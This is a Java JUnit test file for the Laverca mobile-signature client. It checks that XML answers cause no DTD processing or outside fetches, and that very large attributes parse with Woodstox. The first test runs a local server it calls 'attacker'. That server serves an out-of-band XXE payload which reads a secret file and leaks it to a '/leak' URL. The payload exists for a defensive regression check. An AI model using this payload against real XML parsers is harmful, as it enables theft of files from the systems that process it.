/* ==========================================
 * Laverca Project
 * https://sourceforge.net/projects/laverca/
 * ==========================================
 * Copyright 2026 Laverca Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package fi.laverca.test;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;

import javax.xml.stream.XMLInputFactory;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import com.sun.net.httpserver.HttpServer;

import fi.laverca.jaxb.mss.MSSRegistrationReq;
import fi.laverca.jaxb.mss.MSSRegistrationResp;
import fi.laverca.mss.MssClient;

/**
 * Answer parsing: no DTD processing or external fetches, and large attributes even with Woodstox on the classpath.
 */
class XmlParsingTest {

    @TempDir
    Path dir;

    @Test
    void doctypeFetchesNothing() throws Exception {
        final Path secret = Files.writeString(this.dir.resolve("secret.txt"), "TOP-SECRET");
        final List<String> fetched = new CopyOnWriteArrayList<>();
        final HttpServer attacker = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
        final String base = "http://127.0.0.1:" + attacker.getAddress().getPort();
        attacker.createContext("/", ex -> {
            fetched.add(ex.getRequestURI().toString());
            final byte[] b = ("<!ENTITY % file SYSTEM '" + secret.toUri() + "'><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM '"
                              + base + "/leak?d=%file;'>\">%eval;%exfil;").getBytes(StandardCharsets.UTF_8);
            ex.sendResponseHeaders(200, b.length);
            ex.getResponseBody().write(b);
            ex.close();
        });
        attacker.start();
        try (SoapServer s = SoapServer.http()) {
            s.answer(SoapServer.Answer.ok("<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE e SYSTEM '" + base + "/ext.dtd'>"
                                          + SoapServer.env(SoapServer.SIGRESP, null)));
            final MssClient c = Calls.client(s.url());
            assertThrows(Exception.class, () -> c.send(Calls.sig(c)));
        } finally {
            attacker.stop(0);
        }
        assertEquals(List.of(), fetched, "nothing fetched");
    }

    @Test
    void largeAttribute() throws Exception {
        final String crl = "A".repeat(600 * 1024);
        final String resp = "<MSS_RegistrationResponse><mss:MSS_RegistrationResp MajorVersion=\"1\" MinorVersion=\"1\" xmlns:mss=\""
                            + SoapServer.NS + "\"><mss:Status><mss:StatusCode Value=\"408\"/><mss:StatusDetail>"
                            + "<Parameter Name=\"CrlData\" Value=\"" + crl + "\" xmlns=\"urn:test\"/>"
                            + "</mss:StatusDetail></mss:Status></mss:MSS_RegistrationResp></MSS_RegistrationResponse>";
        assertTrue(XMLInputFactory.newFactory().getClass().getName().contains("ctc.wstx"), "Woodstox on the classpath");
        try (SoapServer s = SoapServer.http()) {
            s.answer(SoapServer.Answer.ok(SoapServer.env(resp, null)));
            final MssClient c = Calls.client(s.url());
            final MSSRegistrationReq req = MssClient.mssObjFactory.createMSSRegistrationReq();
            req.setMajorVersion(1L);
            req.setMinorVersion(1L);
            final MSSRegistrationResp r = c.send(req);
            assertEquals(408L, r.getStatus().getStatusCode().getValue().longValue());
        }
    }
}
